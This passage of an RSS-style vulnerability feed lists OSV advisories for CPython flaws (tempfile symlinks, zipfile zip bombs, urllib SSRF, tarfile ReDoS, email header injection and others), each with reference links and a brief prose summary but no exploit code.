                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/03/20/5'>http://www.openwall.com/lists/oss-security/2024/03/20/5</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/02a9259c717738dfe6b463c44d7e17f2b6d2cb3a'>https://github.com/python/cpython/commit/02a9259c717738dfe6b463c44d7e17f2b6d2cb3a</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/5585334d772b253a01a6730e8202ffb1607c3d25'>https://github.com/python/cpython/commit/5585334d772b253a01a6730e8202ffb1607c3d25</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/6ceb8aeda504b079fef7a57b8d81472f15cdd9a5'>https://github.com/python/cpython/commit/6ceb8aeda504b079fef7a57b8d81472f15cdd9a5</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/81c16cd94ec38d61aa478b9a452436dc3b1b524d'>https://github.com/python/cpython/commit/81c16cd94ec38d61aa478b9a452436dc3b1b524d</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/8eaeefe49d179ca4908d052745e3bb8b6f238f82'>https://github.com/python/cpython/commit/8eaeefe49d179ca4908d052745e3bb8b6f238f82</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/d54e22a669ae6e987199bb5d2c69bb5a46b0083b'>https://github.com/python/cpython/commit/d54e22a669ae6e987199bb5d2c69bb5a46b0083b</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/91133'>https://github.com/python/cpython/issues/91133</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2024/03/msg00025.html'>https://lists.debian.org/debian-lts-announce/2024/03/msg00025.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/T3IGRX54M7RNCQOXVQO5KQKTGWCOABIM/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/T3IGRX54M7RNCQOXVQO5KQKTGWCOABIM/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/U5VHWS52HGD743C47UMCSAK2A773M2YE/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/U5VHWS52HGD743C47UMCSAK2A773M2YE/</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/Q5C6ATFC67K53XFV4KE45325S7NS62LD/'>https://mail.python.org/archives/list/security-announce@python.org/thread/Q5C6ATFC67K53XFV4KE45325S7NS62LD/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was found in the CPython `tempfile.TemporaryDirectory` class affecting versions 3.12.1, 3.11.7, 3.10.13, 3.9.18, and 3.8.18 and prior.The tempfile.TemporaryDirectory class would dereference symlinks during cleanup of permissions-related errors. This means users which can run privileged programs are potentially able to modify permissions of files referenced by symlinks in some circumstances.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2024-0397: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2024-0397</link>
                    <pubDate>2025-01-17T15:06:36.200Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2024-0397'>https://osv.dev/vulnerability/BIT-python-min-2024-0397</a><br>
                            <b>Published:</b> 2025-01-17T15:06:36.200Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/06/17/2'>http://www.openwall.com/lists/oss-security/2024/06/17/2</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/01c37f1d0714f5822d34063ca7180b595abf589d'>https://github.com/python/cpython/commit/01c37f1d0714f5822d34063ca7180b595abf589d</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/29c97287d205bf2f410f4895ebce3f43b5160524'>https://github.com/python/cpython/commit/29c97287d205bf2f410f4895ebce3f43b5160524</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/37324b421b72b7bc9934e27aba85d48d4773002e'>https://github.com/python/cpython/commit/37324b421b72b7bc9934e27aba85d48d4773002e</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/542f3272f56f31ed04e74c40635a913fbc12d286'>https://github.com/python/cpython/commit/542f3272f56f31ed04e74c40635a913fbc12d286</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/b228655c227b2ca298a8ffac44d14ce3d22f6faa'>https://github.com/python/cpython/commit/b228655c227b2ca298a8ffac44d14ce3d22f6faa</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/bce693111bff906ccf9281c22371331aaff766ab'>https://github.com/python/cpython/commit/bce693111bff906ccf9281c22371331aaff766ab</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/114572'>https://github.com/python/cpython/issues/114572</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/114573'>https://github.com/python/cpython/pull/114573</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/BMAK5BCGKYWNJOACVUSLUF6SFGBIM4VP/'>https://mail.python.org/archives/list/security-announce@python.org/thread/BMAK5BCGKYWNJOACVUSLUF6SFGBIM4VP/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A defect was discovered in the Python “ssl” module where there is a memoryrace condition with the ssl.SSLContext methods “cert_store_stats()” and“get_ca_certs()”. The race condition can be triggered if the methods arecalled at the same time as certificates are loaded into the SSLContext,such as during the TLS handshake with a certificate directory configured.This issue is fixed in CPython 3.10.14, 3.11.9, and 3.12.3.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2024-0450: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2024-0450</link>
                    <pubDate>2025-01-17T15:06:28.314Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2024-0450'>https://osv.dev/vulnerability/BIT-python-min-2024-0450</a><br>
                            <b>Published:</b> 2025-01-17T15:06:28.314Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/03/20/5'>http://www.openwall.com/lists/oss-security/2024/03/20/5</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/30fe5d853b56138dbec62432d370a1f99409fc85'>https://github.com/python/cpython/commit/30fe5d853b56138dbec62432d370a1f99409fc85</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/66363b9a7b9fe7c99eba3a185b74c5fdbf842eba'>https://github.com/python/cpython/commit/66363b9a7b9fe7c99eba3a185b74c5fdbf842eba</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/70497218351ba44bffc8b571201ecb5652d84675'>https://github.com/python/cpython/commit/70497218351ba44bffc8b571201ecb5652d84675</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/a2c59992e9e8d35baba9695eb186ad6c6ff85c51'>https://github.com/python/cpython/commit/a2c59992e9e8d35baba9695eb186ad6c6ff85c51</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/a956e510f6336d5ae111ba429a61c3ade30a7549'>https://github.com/python/cpython/commit/a956e510f6336d5ae111ba429a61c3ade30a7549</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/d05bac0b74153beb541b88b4fca33bf053990183'>https://github.com/python/cpython/commit/d05bac0b74153beb541b88b4fca33bf053990183</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/fa181fcf2156f703347b03a3b1966ce47be8ab3b'>https://github.com/python/cpython/commit/fa181fcf2156f703347b03a3b1966ce47be8ab3b</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/109858'>https://github.com/python/cpython/issues/109858</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2024/03/msg00024.html'>https://lists.debian.org/debian-lts-announce/2024/03/msg00024.html</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2024/03/msg00025.html'>https://lists.debian.org/debian-lts-announce/2024/03/msg00025.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/T3IGRX54M7RNCQOXVQO5KQKTGWCOABIM/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/T3IGRX54M7RNCQOXVQO5KQKTGWCOABIM/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/U5VHWS52HGD743C47UMCSAK2A773M2YE/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/U5VHWS52HGD743C47UMCSAK2A773M2YE/</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/XELNUX2L3IOHBTFU7RQHCY6OUVEWZ2FG/'>https://mail.python.org/archives/list/security-announce@python.org/thread/XELNUX2L3IOHBTFU7RQHCY6OUVEWZ2FG/</a></li><li>- <a target='_blank' href='https://www.bamsoftware.com/hacks/zipbomb/'>https://www.bamsoftware.com/hacks/zipbomb/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was found in the CPython `zipfile` module affecting versions 3.12.1, 3.11.7, 3.10.13, 3.9.18, and 3.8.18 and prior.The zipfile module is vulnerable to “quoted-overlap” zip-bombs which exploit the zip format to create a zip-bomb with a high compression ratio. The fixed versions of CPython makes the zipfile module reject zip archives which overlap entries in the archive.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2024-11168: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2024-11168</link>
                    <pubDate>2025-01-17T15:06:19.714Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2024-11168'>https://osv.dev/vulnerability/BIT-python-min-2024-11168</a><br>
                            <b>Published:</b> 2025-01-17T15:06:19.714Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/commit/29f348e232e82938ba2165843c448c2b291504c5'>https://github.com/python/cpython/commit/29f348e232e82938ba2165843c448c2b291504c5</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/634ded45545ce8cbd6fd5d49785613dd7fa9b89e'>https://github.com/python/cpython/commit/634ded45545ce8cbd6fd5d49785613dd7fa9b89e</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/b2171a2fd41416cf68afd67460578631d755a550'>https://github.com/python/cpython/commit/b2171a2fd41416cf68afd67460578631d755a550</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/ddca2953191c67a12b1f19d6bca41016c6ae7132'>https://github.com/python/cpython/commit/ddca2953191c67a12b1f19d6bca41016c6ae7132</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/103848'>https://github.com/python/cpython/issues/103848</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/103849'>https://github.com/python/cpython/pull/103849</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/XPWB6XVZ5G5KGEI63M4AWLIEUF5BPH4T/'>https://mail.python.org/archives/list/security-announce@python.org/thread/XPWB6XVZ5G5KGEI63M4AWLIEUF5BPH4T/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The urllib.parse.urlsplit() and urlparse() functions improperly validated bracketed hosts (`[]`), allowing hosts that weren&#x27;t IPv6 or IPvFuture. This behavior was not conformant to RFC 3986 and potentially enabled SSRF if a URL is processed by more than one URL parser.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2024-4032: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2024-4032</link>
                    <pubDate>2025-01-17T15:06:00.800Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2024-4032'>https://osv.dev/vulnerability/BIT-python-min-2024-4032</a><br>
                            <b>Published:</b> 2025-01-17T15:06:00.800Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/06/17/3'>http://www.openwall.com/lists/oss-security/2024/06/17/3</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/22adf29da8d99933ffed8647d3e0726edd16f7f8'>https://github.com/python/cpython/commit/22adf29da8d99933ffed8647d3e0726edd16f7f8</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/40d75c2b7f5c67e254d0a025e0f2e2c7ada7f69f'>https://github.com/python/cpython/commit/40d75c2b7f5c67e254d0a025e0f2e2c7ada7f69f</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/895f7e2ac23eff4743143beef0f0c5ac71ea27d3'>https://github.com/python/cpython/commit/895f7e2ac23eff4743143beef0f0c5ac71ea27d3</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/ba431579efdcbaed7a96f2ac4ea0775879a332fb'>https://github.com/python/cpython/commit/ba431579efdcbaed7a96f2ac4ea0775879a332fb</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/c62c9e518b784fe44432a3f4fc265fb95b651906'>https://github.com/python/cpython/commit/c62c9e518b784fe44432a3f4fc265fb95b651906</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/f86b17ac511e68192ba71f27e752321a3252cee3'>https://github.com/python/cpython/commit/f86b17ac511e68192ba71f27e752321a3252cee3</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/113171'>https://github.com/python/cpython/issues/113171</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/113179'>https://github.com/python/cpython/pull/113179</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/NRUHDUS2IV2USIZM2CVMSFL6SCKU3RZA/'>https://mail.python.org/archives/list/security-announce@python.org/thread/NRUHDUS2IV2USIZM2CVMSFL6SCKU3RZA/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240726-0004/'>https://security.netapp.com/advisory/ntap-20240726-0004/</a></li><li>- <a target='_blank' href='https://www.iana.org/assignments/iana-ipv4-special-registry/iana-ipv4-special-registry.xhtml'>https://www.iana.org/assignments/iana-ipv4-special-registry/iana-ipv4-special-registry.xhtml</a></li><li>- <a target='_blank' href='https://www.iana.org/assignments/iana-ipv6-special-registry/iana-ipv6-special-registry.xhtml'>https://www.iana.org/assignments/iana-ipv6-special-registry/iana-ipv6-special-registry.xhtml</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The “ipaddress” module contained incorrect information about whether certain IPv4 and IPv6 addresses were designated as “globally reachable” or “private”. This affected the is_private and is_global properties of the ipaddress.IPv4Address, ipaddress.IPv4Network, ipaddress.IPv6Address, and ipaddress.IPv6Network classes, where values wouldn’t be returned in accordance with the latest information from the IANA Special-Purpose Address Registries. CPython 3.12.4 contains updated information from these registries and thus have the intended behavior.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2024-5642: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2024-5642</link>
                    <pubDate>2025-01-17T15:05:46.717Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2024-5642'>https://osv.dev/vulnerability/BIT-python-min-2024-5642</a><br>
                            <b>Published:</b> 2025-01-17T15:05:46.717Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/06/28/4'>http://www.openwall.com/lists/oss-security/2024/06/28/4</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/39258d3595300bc7b952854c915f63ae2d4b9c3e'>https://github.com/python/cpython/commit/39258d3595300bc7b952854c915f63ae2d4b9c3e</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/121227'>https://github.com/python/cpython/issues/121227</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/23014'>https://github.com/python/cpython/pull/23014</a></li><li>- <a target='_blank' href='https://jbp.io/2024/06/27/cve-2024-5535-openssl-memory-safety.html'>https://jbp.io/2024/06/27/cve-2024-5535-openssl-memory-safety.html</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/PLP2JI3PJY33YG6P5BZYSSNU66HASXBQ/'>https://mail.python.org/archives/list/security-announce@python.org/thread/PLP2JI3PJY33YG6P5BZYSSNU66HASXBQ/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240726-0005/'>https://security.netapp.com/advisory/ntap-20240726-0005/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>CPython 3.9 and earlier doesn&#x27;t disallow configuring an empty list (&quot;[]&quot;) for SSLContext.set_npn_protocols() which is an invalid value for the underlying OpenSSL API. This results in a buffer over-read when NPN is used (see CVE-2024-5535 for OpenSSL). This vulnerability is of low severity due to NPN being not widely used and specifying an empty list likely being uncommon in-practice (typically a protocol name would be configured).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2024-6232: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2024-6232</link>
                    <pubDate>2025-01-17T15:05:38.715Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2024-6232'>https://osv.dev/vulnerability/BIT-python-min-2024-6232</a><br>
                            <b>Published:</b> 2025-01-17T15:05:38.715Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/commit/4eaf4891c12589e3c7bdad5f5b076e4c8392dd06'>https://github.com/python/cpython/commit/4eaf4891c12589e3c7bdad5f5b076e4c8392dd06</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/743acbe872485dc18df4d8ab2dc7895187f062c4'>https://github.com/python/cpython/commit/743acbe872485dc18df4d8ab2dc7895187f062c4</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/7d1f50cd92ff7e10a1c15a8f591dde8a6843a64d'>https://github.com/python/cpython/commit/7d1f50cd92ff7e10a1c15a8f591dde8a6843a64d</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/b4225ca91547aa97ed3aca391614afbb255bc877'>https://github.com/python/cpython/commit/b4225ca91547aa97ed3aca391614afbb255bc877</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/d449caf8a179e3b954268b3a88eb9170be3c8fbf'>https://github.com/python/cpython/commit/d449caf8a179e3b954268b3a88eb9170be3c8fbf</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/ed3a49ea734ada357ff4442996fd4ae71d253373'>https://github.com/python/cpython/commit/ed3a49ea734ada357ff4442996fd4ae71d253373</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/121285'>https://github.com/python/cpython/issues/121285</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/121286'>https://github.com/python/cpython/pull/121286</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/JRYFTPRHZRTLMZLWQEUHZSJXNHM4ACTY/'>https://mail.python.org/archives/list/security-announce@python.org/thread/JRYFTPRHZRTLMZLWQEUHZSJXNHM4ACTY/</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/09/03/5'>http://www.openwall.com/lists/oss-security/2024/09/03/5</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20241018-0007/'>https://security.netapp.com/advisory/ntap-20241018-0007/</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/34ddb64d088dd7ccc321f6103d23153256caa5d4'>https://github.com/python/cpython/commit/34ddb64d088dd7ccc321f6103d23153256caa5d4</a></li></ul><br>
                            <b>Details:</b> <b></b><br>There is a MEDIUM severity vulnerability affecting CPython.Regular expressions that allowed excessive backtracking during tarfile.TarFile header parsing are vulnerable to ReDoS via specifically-crafted tar archives.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2024-6923: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2024-6923</link>
                    <pubDate>2025-01-17T15:05:30.197Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2024-6923'>https://osv.dev/vulnerability/BIT-python-min-2024-6923</a><br>
                            <b>Published:</b> 2025-01-17T15:05:30.197Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/commit/06f28dc236708f72871c64d4bc4b4ea144c50147'>https://github.com/python/cpython/commit/06f28dc236708f72871c64d4bc4b4ea144c50147</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/4766d1200fdf8b6728137aa2927a297e224d5fa7'>https://github.com/python/cpython/commit/4766d1200fdf8b6728137aa2927a297e224d5fa7</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/4aaa4259b5a6e664b7316a4d60bdec7ee0f124d0'>https://github.com/python/cpython/commit/4aaa4259b5a6e664b7316a4d60bdec7ee0f124d0</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/b158a76ce094897c870fb6b3de62887b7ccc33f1'>https://github.com/python/cpython/commit/b158a76ce094897c870fb6b3de62887b7ccc33f1</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/f7be505d137a22528cb0fc004422c0081d5d90e6'>https://github.com/python/cpython/commit/f7be505d137a22528cb0fc004422c0081d5d90e6</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/f7c0f09e69e950cf3c5ada9dbde93898eb975533'>https://github.com/python/cpython/commit/f7c0f09e69e950cf3c5ada9dbde93898eb975533</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/121650'>https://github.com/python/cpython/issues/121650</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/122233'>https://github.com/python/cpython/pull/122233</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/QH3BUOE2DYQBWP7NAQ7UNHPPOELKISRW/'>https://mail.python.org/archives/list/security-announce@python.org/thread/QH3BUOE2DYQBWP7NAQ7UNHPPOELKISRW/</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/08/01/3'>http://www.openwall.com/lists/oss-security/2024/08/01/3</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/08/02/2'>http://www.openwall.com/lists/oss-security/2024/08/02/2</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2025/01/msg00005.html'>https://lists.debian.org/debian-lts-announce/2025/01/msg00005.html</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240926-0003/'>https://security.netapp.com/advisory/ntap-20240926-0003/</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/097633981879b3c9de9a1dd120d3aa585ecc2384'>https://github.com/python/cpython/commit/097633981879b3c9de9a1dd120d3aa585ecc2384</a></li></ul><br>
                            <b>Details:</b> <b></b><br>There is a MEDIUM severity vulnerability affecting CPython.The email module didn’t properly quote newlines for email headers when serializing an email message allowing for header injection when an email is serialized.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2024-7592: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2024-7592</link>
                    <pubDate>2025-01-17T15:05:21.600Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2024-7592'>https://osv.dev/vulnerability/BIT-python-min-2024-7592</a><br>
                            <b>Published:</b> 2025-01-17T15:05:21.600Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/commit/391e5626e3ee5af267b97e37abc7475732e67621'>https://github.com/python/cpython/commit/391e5626e3ee5af267b97e37abc7475732e67621</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/a77ab24427a18bff817025adb03ca920dc3f1a06'>https://github.com/python/cpython/commit/a77ab24427a18bff817025adb03ca920dc3f1a06</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/b2f11ca7667e4d57c71c1c88b255115f16042d9a'>https://github.com/python/cpython/commit/b2f11ca7667e4d57c71c1c88b255115f16042d9a</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/d4ac921a4b081f7f996a5d2b101684b67ba0ed7f'>https://github.com/python/cpython/commit/d4ac921a4b081f7f996a5d2b101684b67ba0ed7f</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/d662e2db2605515a767f88ad48096b8ac623c774'>https://github.com/python/cpython/commit/d662e2db2605515a767f88ad48096b8ac623c774</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/dcc3eaef98cd94d6cb6cb0f44bd1c903d04f33b1'>https://github.com/python/cpython/commit/dcc3eaef98cd94d6cb6cb0f44bd1c903d04f33b1</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/123067'>https://github.com/python/cpython/issues/123067</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/123075'>https://github.com/python/cpython/pull/123075</a></li><li>- <a target='_blank' href='https://mail.python.org/archives/list/security-announce@python.org/thread/HXJAAAALNUNGCQUS2W7WR6GFIZIHFOOK/'>https://mail.python.org/archives/list/security-announce@python.org/thread/HXJAAAALNUNGCQUS2W7WR6GFIZIHFOOK/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20241018-0006/'>https://security.netapp.com/advisory/ntap-20241018-0006/</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/44e458357fca05ca0ae2658d62c8c595b048b5ef'>https://github.com/python/cpython/commit/44e458357fca05ca0ae2658d62c8c595b048b5ef</a></li></ul><br>
                            <b>Details:</b> <b></b><br>There is a LOW severity vulnerability affecting CPython, specifically the&#x27;http.cookies&#x27; standard library module.When parsing cookies that contained backslashes for quoted characters inthe cookie value, the parser would use an algorithm with quadraticcomplexity, resulting in excess CPU resources being used while parsing thevalue.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-python-min-2024-8088: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-python-min-2024-8088</link>
                    <pubDate>2025-01-17T15:05:13.901Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-python-min-2024-8088'>https://osv.dev/vulnerability/BIT-python-min-2024-8088</a><br>
                            <b>Published:</b> 2025-01-17T15:05:13.901Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/python/cpython/commit/0aa1ee22ab6e204e9d3d0e9dd63ea648ed691ef1'>https://github.com/python/cpython/commit/0aa1ee22ab6e204e9d3d0e9dd63ea648ed691ef1</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/2231286d78d328c2f575e0b05b16fe447d1656d6'>https://github.com/python/cpython/commit/2231286d78d328c2f575e0b05b16fe447d1656d6</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/795f2597a4be988e2bb19b69ff9958e981cb894e'>https://github.com/python/cpython/commit/795f2597a4be988e2bb19b69ff9958e981cb894e</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/7bc367e464ce50b956dd232c1dfa1cad4e7fb814'>https://github.com/python/cpython/commit/7bc367e464ce50b956dd232c1dfa1cad4e7fb814</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/7e8883a3f04d308302361aeffc73e0e9837f19d4'>https://github.com/python/cpython/commit/7e8883a3f04d308302361aeffc73e0e9837f19d4</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/8c7348939d8a3ecd79d630075f6be1b0c5b41f64'>https://github.com/python/cpython/commit/8c7348939d8a3ecd79d630075f6be1b0c5b41f64</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/95b073bddefa6243effa08e131e297c0383e7f6a'>https://github.com/python/cpython/commit/95b073bddefa6243effa08e131e297c0383e7f6a</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/962055268ed4f2ca1d717bfc8b6385de50a23ab7'>https://github.com/python/cpython/commit/962055268ed4f2ca1d717bfc8b6385de50a23ab7</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/dcc5182f27c1500006a1ef78e10613bb45788dea'>https://github.com/python/cpython/commit/dcc5182f27c1500006a1ef78e10613bb45788dea</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/e0264a61119d551658d9445af38323ba94fc16db'>https://github.com/python/cpython/commit/e0264a61119d551658d9445af38323ba94fc16db</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/fc0b8259e693caa8400fa8b6ac1e494e47ea7798'>https://github.com/python/cpython/commit/fc0b8259e693caa8400fa8b6ac1e494e47ea7798</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/122905'>https://github.com/python/cpython/issues/122905</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/issues/123270'>https://github.com/python/cpython/issues/123270</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/122906'>https://github.com/python/cpython/pull/122906</a></li><li>- <a target='_blank' 